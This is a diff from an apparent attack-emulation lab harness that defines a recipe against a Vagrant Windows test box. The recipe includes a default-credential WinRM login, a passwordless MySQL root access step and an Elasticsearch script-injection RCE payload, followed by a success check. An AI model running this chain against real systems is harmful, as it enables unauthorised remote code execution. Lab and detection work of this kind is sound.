+        # curl but not nmap/nxc, so recon can't be independently re-verified the
+        # same way nmap ran it, but the ES version banner is equally valid T1595
+        # evidence and curl-only). PowerShell's default redirect encoding is
+        # UTF-16LE, which grep can't match against ASCII patterns -- Out-File
+        # -Encoding ascii avoids that.
+        command=r"""nmap -sV -p 21,22,80,135,445,3306,3389,4848,8080,8282,8484,8585,9200 "$TARGET_HOST" 2>&1 | tail -20; nxc winrm "$TARGET_HOST" -u vagrant -p vagrant -X "whoami | Out-File -FilePath C:\inetpub\wwwroot\portalproof-fc.txt -Encoding ascii" 2>&1; mysql -h "$TARGET_HOST" -u root --connect-timeout=8 --skip-ssl -e "SELECT @@version_compile_os; SHOW DATABASES;" 2>&1; curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/" -H 'Content-Type: application/json' -d '{"name":"portal-proof"}' >/dev/null; es_out=$(curl -sS -m 10 -X POST "http://$TARGET_HOST:9200/website/blog/_search?pretty" -H 'Content-Type: application/json' -d '{"size":1,"query":{"match_all":{}},"script_fields":{"exp":{"script":"import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}'); printf '%s\n' "$es_out"; printf '%s' "$es_out" | grep -Eiq 'nt authority' && echo __PORTAL_RECIPE_OK__""",
+        # A literal `\v` sequence (backslash immediately before the letter v)
+        # gets corrupted into an actual vertical-tab control character
+        # somewhere in the exec transport -- found live 2026-08-01 debugging
+        # postcondition_success:false despite curl proving the real data was
+        # correct end to end. "vagrant-2008r2.vagrant" ('.' matches the literal
+        # backslash the target actually wrote just as well, unambiguously,
+        # since no other character can appear there) sidesteps the whole
+        # landmine instead of fighting the escaping layer that causes it.
+        # "Elasticsearch" the word never actually appears in the real / root
+        # response -- that label is nmap's own service-detection guess, not
+        # the target's real banner (found live 2026-08-01 debugging
+        # postcondition_success:false with a valid network path and a
+        # correct T1078 check: the T1595 check was checking for text that
+        # was never there). The real banner is "You Know, for Search".
+        # The final success line itself must also use printf, not echo -- this
+        # box's /bin/sh is dash, whose builtin echo interprets backslash
+        # escapes (XSI behavior) by default, so `echo "...$wa..."` silently
+        # turned the real backslash in "vagrant-2008r2\vagrant" into a literal
+        # vertical-tab byte in the captured postcondition text, which then
+        # failed to match the T1078 signature even though the check that
+        # gated reaching this line (grep via printf, unaffected) had already
+        # confirmed the real data was correct.
+        postcondition_command=r"""sh -lc 'wa=$(curl -sS -m 10 "http://$TARGET_HOST/portalproof-fc.txt"); es=$(curl -sS -m 10 "http://$TARGET_HOST:9200/"); ok1=0; ok2=0; printf "%s" "$wa" | grep -Eiq "vagrant-2008r2.vagrant" && ok1=1; printf "%s" "$es" | grep -Eiq "You Know, for Search" && ok2=1; test "$ok1" = 1 -a "$ok2" = 1 && printf "PORTAL_TARGET_POSTCONDITION:full-chain:%s|%s\n" "$wa" "$es"' """,
+        postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:full-chain:",
+    ),
 }
 
 
@@ -148,9 +407,16 @@ def render_recipe_command(recipe: CaptureRecipe, *, host: str, port: int) -> str
     return recipe.command.replace("$TARGET_HOST", host).replace("$TARGET_PORT", str(port))
 
 
-def render_postcondition_command(recipe: CaptureRecipe, *, port: int) -> str:
-    """Resolve the target container's published-port placeholder."""
-    return recipe.postcondition_command.replace("$TARGET_PORT", str(port))
+def render_postcondition_command(recipe: CaptureRecipe, *, port: int, host: str = "") -> str:
+    """Resolve the target's published-port (and, when the postcondition reaches
+    a real host over the network rather than docker-exec'ing on the capture
+    host, address) placeholders. `host` defaults to empty for the vulhub
+    docker-exec style postconditions that never needed it (they operate
+    entirely on the capture host via `docker ps --filter publish=$TARGET_PORT`)."""
+    rendered = recipe.postcondition_command.replace("$TARGET_PORT", str(port))
+    if host:
+        rendered = rendered.replace("$TARGET_HOST", host)
+    return rendered
 
 
 def render_host_command(recipe_command: str, *, host: str, port: int) -> str:
